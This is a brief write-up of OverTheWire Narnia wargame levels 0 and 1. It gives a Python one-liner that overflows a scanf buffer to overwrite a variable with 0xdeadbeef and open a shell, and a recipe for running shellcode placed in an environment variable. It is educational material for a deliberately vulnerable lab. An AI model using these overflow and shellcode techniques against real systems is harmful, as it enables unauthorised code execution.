# Binary Exploitation/Pwn challenges from OverTheWire

## Narnia0

We have a `char buf[20]` buffer, but the input is taken as `scanf("%24s",&buf);` and we know that the shell is only executed when the val is at **0xdeadbeef**.

We build the hex address: "\xef\xbe\xad\xde" and with `cat -` we hold the shell open:

```bash
(python -c 'print("A"*20+"\xef\xbe\xad\xde")'; cat -; ) | ./narnia0
```

## Narnia1

This time the code reads from the `env` the variable. We have to set EGG as a shellcode.
We can pick any shellcode from [here](https://www.exploit-db.com/shellcodes):  

```bash
export EGG=`python -c 'print "<shellcode>"'`

./narnia1
```

